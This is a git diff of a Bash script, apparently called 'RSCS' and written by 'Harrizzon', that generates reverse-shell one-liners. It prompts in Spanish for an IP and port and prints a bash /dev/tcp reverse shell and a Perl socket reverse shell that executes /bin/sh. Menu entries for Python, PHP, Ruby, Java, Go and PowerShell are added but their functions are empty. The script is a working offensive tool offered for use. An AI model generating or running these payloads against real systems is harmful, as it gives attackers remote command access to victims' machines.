@@ -16,15 +16,6 @@ turquois="\e[0;36m\033[1m"
 gray="\e[0;37m\033[1m"
 bold="\e[1m"
 
-# FLUJO
-declare aipi
-declare portk
-echo -e "${red}$ Ingresa tu IP${end}${green}"
-read ipe
-echo -e "${end}${red}$ Ingresa un puerto${end}${green}"
-read portt
-aipi=$ipe
-portk=$portt
 
 
 
@@ -42,12 +33,12 @@ function ctrl_c(){
 
 function banner(){
     echo -e "${turquois}
-            ____  _____ ___________
-           / __ \/ ___// ____/ ___/
-          / /_/ /\__ \/ /    \__ \ 
-         / _, _/___/ / /___ ___/ / 
-        /_/ |_|/____/\____//____/   
-        ${end}"
+                ____  _____ ___________      
+               / __ \/ ___// ____/ ___/            
+         >    / /_/ /\__ \/ /    \__ \   <        
+         >   / _, _/___/ / /___ ___/ /   < 
+            /_/ |_|/____/\____//____/    
+    "${end}
     echo -e "\t   ${red}>${end}${purple} By: ${end}${yellow}Harrizzon${end}${red} ! <${end}\n"
 }
 
@@ -75,13 +66,13 @@ function menu(){
         read opc
         case $opc in
             1) bashm; opt=1;;
-            #2)
-            #3)
-            #4)
-            #5)
-            #6)
-            #7)
-            #8)
+            2) perlm; opt=1;;
+            3) pym; opt=1;;
+            4) phpm; opt=1;;
+            5) rubym; opt=1;;
+            6) javam; opt=1;;
+            7) gom; opt=1;;
+            8) powerm; opt=1;;
             *) echo -e "${red}[!]${end} Seleccione una opcion valida ${red}[!]${end}";sleep 1.2; clear
         esac
 
@@ -91,8 +82,51 @@ function menu(){
 
 function bashm(){
     clear
-    echo -e "${green}bash -i >& /dev/tcp/$aipi/$portk 0>&1${end}"
+    echo -e "${green}bash -i >& /dev/tcp/${red}$aipi${end}${green}/${end}${red}$portk${end}${green} 0>&1${end}"
 
 }
+
+function perlm(){
+    clear
+    echo -e "${green}perl -e 'use Socket;"'$i'"""=""${red}$aipi${end}${green}"";"'$p'"=${end}${red}$portk${end}${green};socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in("'$p'",inet_aton("'$i'")))){open(STDIN,"'>&S'");open(STDOUT,"'>&S'");open(STDERR,"'>&S'");exec("'/bin/sh -i'");};'${end}"
+
+
+}
+
+function pym(){
+    clear
+}
+
+function phpm(){
+    clear
+}
+
+function rubym(){
+    clear
+
+}
+
+function javam(){
+    clear
+}
+
+function gom(){
+    clear
+}
+
+function powerm(){
+    clear
+    
+}
+
+# FLUJO
+declare aipi
+declare portk
+echo -e "${red}[>] Ingresa tu IP${end}${green}"
+read ipe
+echo -e "${end}${red}[>] Ingresa un puerto${end}${green}"
+read portt
+aipi=$ipe
+portk=$portt
 
 menu
